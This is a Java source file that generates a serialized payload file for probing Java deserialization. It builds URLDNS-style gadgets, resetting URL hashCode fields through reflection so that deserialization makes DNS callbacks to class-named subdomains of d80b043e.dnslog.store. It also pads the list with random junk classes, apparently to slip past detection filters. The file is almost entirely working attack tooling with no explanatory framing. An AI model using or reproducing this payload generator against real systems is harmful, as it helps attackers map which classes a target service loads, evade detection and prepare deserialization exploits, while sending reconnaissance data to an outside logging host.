package com.demo3;

import com.demo.common.MyListClass;
import com.demo.common.Utils;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

import static com.demo.common.Utils.Serialize;

public class TestWithDritydata {

    public static HashMap makeMap(Object targetClazz,String dnslog) throws Exception{

        HashMap<URL, Object> hashMap = new HashMap<>();
        URL url = new URL(null, "http://"+dnslog, new TestUID.SilentURLStreamHandler());

        hashMap.put( url, targetClazz);

        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);
        return hashMap;
    }

    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }


    public static void add(List list, String clazzName) throws Exception{
        list.add(makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.","")+".d80b043e.dnslog.store"));
    }
    public static void add(MyListClass list, String clazzName) throws Exception{
        list.add(makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.","")+".d80b043e.dnslog.store"));
    }

    public static void main(String[] args) throws Exception {

        String file = "demo3.ser";

        List list = new LinkedList();
        for (int i = 0; i < 100; i++) {
            list.add(Utils.MakeClass(getRandomString(10)));
        }
        // gadget
        list.add(makeMap(Utils.MakeClass("com.demo.common.TargetDetectClass"), "TargetDetectClass.d80b043e.dnslog.store"));
        list.add(getRandomString(10));

        Serialize(list, file);

        // Deserialize(file);
    }


}
